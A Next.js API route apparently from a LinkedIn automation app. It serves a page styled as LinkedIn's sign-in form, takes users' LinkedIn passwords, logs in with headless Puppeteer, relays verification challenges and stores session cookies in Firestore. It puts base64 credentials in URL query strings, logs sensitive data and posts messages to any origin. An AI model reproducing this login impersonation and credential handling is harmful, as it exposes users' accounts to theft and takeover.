import { adminDb } from '@/app/lib/firebaseAdmin';
import type { Browser, Page, Cookie } from 'puppeteer';
import puppeteer from 'puppeteer';

// Keep track of active verification sessions
const verificationSessions = new Map<string, { 
  browser: Browser; 
  page: Page;
  lastChecked: Date;
}>();

// Cleanup old sessions every 5 minutes
setInterval(() => {
  const now = new Date();
  for (const [sessionId, session] of verificationSessions.entries()) {
    if (now.getTime() - session.lastChecked.getTime() > 10 * 60 * 1000) { // 10 minutes
      session.browser.close();
      verificationSessions.delete(sessionId);
    }
  }
}, 5 * 60 * 1000);

async function startVerificationSession(sessionId: string, challengeUrl: string): Promise<void> {
  // Close any existing session
  const existingSession = verificationSessions.get(sessionId);
  if (existingSession) {
    await existingSession.browser.close();
    verificationSessions.delete(sessionId);
  }

  const browser = await puppeteer.launch({ 
    headless: true,
    args: ['--no-sandbox', '--disable-setuid-sandbox'],
    defaultViewport: { width: 1280, height: 800 }
  });
  const page = await browser.newPage();
  
  // Set up monitoring
  page.on('response', async response => {
    if (response.url().includes('checkpoint') || response.url().includes('challenge')) {
      console.log(`Challenge Response: ${response.status()} ${response.url()}`);
      try {
        const text = await response.text();
        console.log('Response body:', text);
      } catch {
        console.log('Could not get response body');
      }
    }
  });

  // Monitor console logs
  page.on('console', msg => {
    console.log('Browser console:', msg.text());
  });

  // Set user agent and navigate to challenge page
  await page.setUserAgent('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36');
  await page.goto(challengeUrl, { waitUntil: 'networkidle0' });

  verificationSessions.set(sessionId, { 
    browser, 
    page,
    lastChecked: new Date()
  });
}

async function checkVerificationStatus(sessionId: string): Promise<{ 
  success: boolean; 
  cookies?: Cookie[];
}> {
  const session = verificationSessions.get(sessionId);
  if (!session) {
    return { success: false };
  }

  try {
    const { page, browser } = session;
    
    // Update last checked time
    session.lastChecked = new Date();

    // Get current URL
    const currentUrl = await page.url();
    console.log('Current verification URL:', currentUrl);

    // Check if we've been redirected to feed/network
    if (currentUrl.includes('/feed') || currentUrl.includes('/mynetwork')) {
      console.log('Verification successful - redirected to feed');
      const cookies = await page.cookies();
      await browser.close();
      verificationSessions.delete(sessionId);
      return { success: true, cookies };
    }

    // Still on challenge page
    return { success: false };
  } catch (error) {
    console.error('Error checking verification status:', error);
    return { success: false };
  }
}

interface AuthResult {
  success: boolean;
  error?: string;
  debug?: {
    message?: string;
    errorText?: string;
    pageContent?: string;
    screenshot?: string;
    challengeUrl?: string;
    challengeType?: 'device' | 'sms' | 'email';
  };
}

async function waitForAuthSuccess(page: Page): Promise<AuthResult> {
  try {
    console.log('Waiting for auth result...');
    
    // Enable request logging
    page.on('request', request => {
      if (request.url().includes('checkpoint') || request.url().includes('challenge')) {
        console.log(`Challenge Request: ${request.method()} ${request.url()}`, {
          headers: request.headers(),
          postData: request.postData()
        });
      }
    });

    page.on('response', async response => {
      if (response.url().includes('checkpoint') || response.url().includes('challenge')) {
        console.log(`Challenge Response: ${response.status()} ${response.url()}`);
        try {
          const text = await response.text();
          console.log('Response body:', text);
        } catch {
          console.log('Could not get response body');
        }
      }
    });

    // Log any console messages from the page
    page.on('console', msg => {
      console.log('Browser console:', msg.text());
    });

    // Check if we're already on a challenge page
    const currentUrl = await page.url();
    if (currentUrl.includes('checkpoint') || currentUrl.includes('challenge')) {
      const html = await page.content();
      return {
        success: false,
        error: 'verification_required',
        debug: {
          message: 'On challenge page',
          challengeUrl: currentUrl,
          pageContent: html
        }
      };
    }

    // Wait for either success (feed page) or various auth challenges
    const result = await Promise.race([
      // Success case - we reach the feed
      page.waitForFunction(() => {
        const url = window.location.href;
        return url.includes('linkedin.com/feed') || url.includes('/mynetwork');
      }, { timeout: 10000 })
        .then(() => ({ success: true } as AuthResult))
        .catch(e => ({ success: false, error: 'feed_timeout', debug: { message: e.message } } as AuthResult)),
      
      // Challenge detection
      Promise.race([
        page.waitForSelector('iframe[src*="checkpoint"]', { timeout: 10000 }),
        page.waitForSelector('[data-test-id="device-challenge"]', { timeout: 10000 }),
        page.waitForSelector('[data-test-id="verification-code"]', { timeout: 10000 }),
        page.waitForSelector('[data-test-id="two-step-challenge"]', { timeout: 10000 }),
        page.waitForSelector('#input__phone_verification_pin', { timeout: 10000 }),
        page.waitForSelector('#pin-verify', { timeout: 10000 })
      ]).then(async () => {
        const challengeUrl = await page.url();
        const html = await page.content();
        
        // Determine challenge type
        let challengeType: 'device' | 'sms' | 'email' = 'device';
        if (html.includes('phone_verification') || html.includes('Enter SMS code')) {
          challengeType = 'sms';
        } else if (html.includes('email_verification') || html.includes('Enter email code')) {
          challengeType = 'email';
        }
        
        await page.screenshot({ path: '/tmp/linkedin-challenge.png' });
        
        return {
          success: false,
          error: 'verification_required',
          debug: {
            message: 'Device verification or PIN required',
            challengeUrl,
            pageContent: html,
            challengeType
          }
        } as AuthResult;
      }).catch(e => ({ 
        success: false, 
        error: 'verification_detection_failed', 
        debug: { message: e.message } 
      } as AuthResult)),
      
      // Invalid credentials case
      page.waitForSelector('#error-for-password', { timeout: 10000 })
        .then(async () => {
          const errorText = await page.$eval('#error-for-password', el => el.textContent || '');
          return { success: false, error: 'invalid', debug: { errorText } } as AuthResult;
        })
        .catch(e => ({ success: false, error: 'error_timeout', debug: { message: e.message } } as AuthResult))
    ]);

    return result;
  } catch (error) {
    console.error('Unexpected error in waitForAuthSuccess:', error);
    return { success: false, error: 'timeout', debug: { message: error instanceof Error ? error.message : String(error) } };
  }
}

export async function GET(req: Request) {
  const { searchParams } = new URL(req.url);
  const sessionId = searchParams.get('sessionId');
  const isPoll = searchParams.get('poll') === 'true';
  let browser: Browser | undefined;

  if (!sessionId) {
    return new Response(
      `<script>window.close();</script>`,
      { headers: { 'Content-Type': 'text/html' } }
    );
  }

  // Get the session
  const sessionDoc = await adminDb.collection('linkedinAuthSessions').doc(sessionId).get();
  if (!sessionDoc.exists) {
    return new Response(
      `<script>window.close();</script>`,
      { headers: { 'Content-Type': 'text/html' } }
    );
  }

  const sessionData = sessionDoc.data();
  if (!sessionData?.userId) {
    return new Response(
      `<script>window.close();</script>`,
      { headers: { 'Content-Type': 'text/html' } }
    );
  }

  if (new Date() > new Date(sessionData.expiresAt.toDate())) {
    return new Response(
      `<script>window.close();</script>`,
      { headers: { 'Content-Type': 'text/html' } }
    );
  }

  // Return the login form first
  if (!searchParams.get('credentials')) {
    return new Response(`
      <!DOCTYPE html>
      <html>
        <head>
          <title>LinkedIn Login</title>
          <meta name="viewport" content="width=device-width, initial-scale=1">
          <style>
            body {
              font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
              background: #f3f2ef;
              display: flex;
              justify-content: center;
              align-items: center;
              min-height: 100vh;
              margin: 0;
              padding: 20px;
            }
            .container {
              background: white;
              padding: 24px;
              border-radius: 8px;
              box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
              width: 100%;
              max-width: 400px;
            }
            .form-group {
              margin-bottom: 16px;
            }
            label {
              display: block;
              margin-bottom: 8px;
              color: #333;
              font-weight: 500;
            }
            input {
              width: 100%;
              padding: 8px 12px;
              border: 1px solid #ddd;
              border-radius: 4px;
              font-size: 16px;
            }
            button {
              background: #0a66c2;
              color: white;
              border: none;
              padding: 12px 24px;
              border-radius: 24px;
              font-size: 16px;
              font-weight: 600;
              width: 100%;
              cursor: pointer;
            }
            button:hover {
              background: #004182;
            }
            .header {
              text-align: center;
              margin-bottom: 24px;
            }
            .logo {
              width: 84px;
              margin-bottom: 16px;
            }
            .error {
              color: #dc2626;
              margin-top: 8px;
              font-size: 14px;
            }
            .info {
              background: #f3f4f6;
              border-radius: 8px;
              padding: 12px;
              margin-bottom: 16px;
              font-size: 14px;
              color: #4b5563;
            }
            .verification-message {
              background: #fef3c7;
              border: 1px solid #f59e0b;
              padding: 12px;
              border-radius: 8px;
              margin-top: 16px;
              font-size: 14px;
              color: #92400e;
              display: none;
            }
          </style>
        </head>
        <body>
          <div class="container">
            <div class="header">
              <img src="https://content.linkedin.com/content/dam/me/business/en-us/amp/brand-site/v2/bg/LI-Logo.svg.original.svg" alt="LinkedIn" class="logo">
              <h2>Sign in to LinkedIn</h2>
            </div>
            <div class="info">
              Note: You may need to verify your device or enter a code sent to your phone/email after logging in.
            </div>
            <form id="loginForm">
              <div class="form-group">
                <label for="email">Email</label>
                <input type="email" id="email" name="email" required>
              </div>
              <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
                <div id="error" class="error" style="display: none;"></div>
              </div>
              <button type="submit" id="submitBtn">Sign in</button>
              <div id="verificationMessage" class="verification-message">
                Please check your other devices or phone for a verification notification/message.
                This window will automatically proceed once you verify on your device.
              </div>
            </form>
          </div>
          <script>
            const form = document.getElementById('loginForm');
            const submitBtn = document.getElementById('submitBtn');
            const error = document.getElementById('error');
            const verificationMessage = document.getElementById('verificationMessage');
            let pollInterval;
            let challengeUrl = null;

            async function startPolling(credentials) {
              if (!challengeUrl) return;
              
              try {
                const pollResponse = await fetch(window.location.href + 
                  '&credentials=' + credentials + 
                  '&poll=true&challengeUrl=' + encodeURIComponent(challengeUrl));
                
                if (pollResponse.ok) {
                  const result = await pollResponse.json();
                  if (result.success) {
                    clearInterval(pollInterval);
                    window.opener.postMessage({ type: 'LINKEDIN_AUTH_SUCCESS' }, '*');
                    window.close();
                  }
                }
              } catch (err) {
                console.error('Poll error:', err);
              }
            }

            form.addEventListener('submit', async (e) => {
              e.preventDefault();
              error.style.display = 'none';
              verificationMessage.style.display = 'none';
              submitBtn.disabled = true;
              submitBtn.textContent = 'Signing in...';

              const email = document.getElementById('email').value;
              const password = document.getElementById('password').value;
              const credentials = btoa(JSON.stringify({ email, password }));
              
              try {
                const response = await fetch(window.location.href + '&credentials=' + credentials);
                const contentType = response.headers.get('content-type');
                
                if (contentType && contentType.includes('application/json')) {
                  const result = await response.json();
                  if (result.error === 'verification_required' && result.challengeUrl) {
                    challengeUrl = result.challengeUrl;
                    verificationMessage.style.display = 'block';
                    submitBtn.textContent = 'Waiting for verification...';
                    
                    // Start polling every 5 seconds
                    clearInterval(pollInterval);
                    await startPolling(credentials);
                    pollInterval = setInterval(() => startPolling(credentials), 5000);
                  }
                } else {
                  const html = await response.text();
                  if (html.includes('error-for-password')) {
                    error.textContent = 'Invalid email or password.';
                    error.style.display = 'block';
                    submitBtn.disabled = false;
                    submitBtn.textContent = 'Sign in';
                  } else {
                    // Inject the response HTML
                    document.open();
                    document.write(html);
                    document.close();
                  }
                }
              } catch (err) {
                error.textContent = 'An error occurred. Please try again.';
                error.style.display = 'block';
                submitBtn.disabled = false;
                submitBtn.textContent = 'Sign in';
              }
            });

            // Clean up polling on window close
            window.addEventListener('beforeunload', () => {
              clearInterval(pollInterval);
            });
          </script>
        </body>
      </html>
    `, { headers: { 'Content-Type': 'text/html' } });
  }

  // Handle polling request
  if (isPoll) {
    const status = await checkVerificationStatus(sessionId);
    if (status.success && status.cookies) {
      // Store the session
      await adminDb.collection('linkedinSessions').doc(sessionData.userId).set({
        cookies: status.cookies,
        createdAt: new Date(),
        expiresAt: new Date(Date.now() + 24 * 60 * 60 * 1000)
      });

      // Clean up the auth session
      await adminDb.collection('linkedinAuthSessions').doc(sessionId).delete();
    }
    return Response.json({ success: status.success });
  }

  // Handle initial login
  try {
    const credentials = JSON.parse(atob(searchParams.get('credentials') || ''));
    console.log('Starting login process for:', credentials.email);
    
    browser = await puppeteer.launch({ 
      headless: true,
      args: ['--no-sandbox', '--disable-setuid-sandbox'],
      defaultViewport: { width: 1280, height: 800 }
    });
    const page = await browser.newPage();

    // Set a more realistic user agent
    await page.setUserAgent('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36');

    console.log('Navigating to LinkedIn login page...');
    await page.goto('https://www.linkedin.com/login', { waitUntil: 'networkidle0' });
    
    console.log('Filling in credentials...');
    await page.type('#username', credentials.email);
    await page.type('#password', credentials.password);
    
    console.log('Submitting form...');
    await Promise.all([
      page.waitForNavigation({ waitUntil: 'networkidle0' }).catch(e => console.log('Navigation error:', e)),
      page.click('[type="submit"]')
    ]);

    console.log('Waiting for auth result...');
    const authResult = await waitForAuthSuccess(page);
    console.log('Auth result:', authResult);
    
    if (authResult.success) {
      console.log('Login successful, capturing cookies...');
      const cookies = await page.cookies();
      
      console.log('Storing session...');
      await adminDb.collection('linkedinSessions').doc(sessionData.userId).set({
        cookies,
        createdAt: new Date(),
        expiresAt: new Date(Date.now() + 24 * 60 * 60 * 1000) // 24 hours
      });

      await browser.close();
      console.log('Login process completed successfully');

      // Clean up the auth session
      await adminDb.collection('linkedinAuthSessions').doc(sessionId).delete();

      return new Response(`
        <script>
          window.opener.postMessage({ type: 'LINKEDIN_AUTH_SUCCESS' }, '*');
          window.close();
        </script>
      `, { headers: { 'Content-Type': 'text/html' } });
    } else if (authResult.error === 'verification_required' && authResult.debug?.challengeUrl) {
      // Start verification session and return challenge status
      await startVerificationSession(sessionId, authResult.debug.challengeUrl);
      await browser.close();
      return Response.json({
        error: 'verification_required',
        challengeUrl: authResult.debug.challengeUrl
      });
    } else {
      // Return the current page HTML for other cases
      const html = await page.content();
      await browser.close();
      return new Response(html, { headers: { 'Content-Type': 'text/html' } });
    }
  } catch (error) {
    if (error instanceof Error) {
      console.error('Error in LinkedIn login:', error.message, error.stack);
    } else {
      console.error('Unknown error in LinkedIn login:', error);
    }
    await browser?.close();
    return new Response(`
      <script>
        alert('An error occurred. Please try again.');
        window.location.href = window.location.href.split('&credentials=')[0];
      </script>
    `, { headers: { 'Content-Type': 'text/html' } });
  }
} 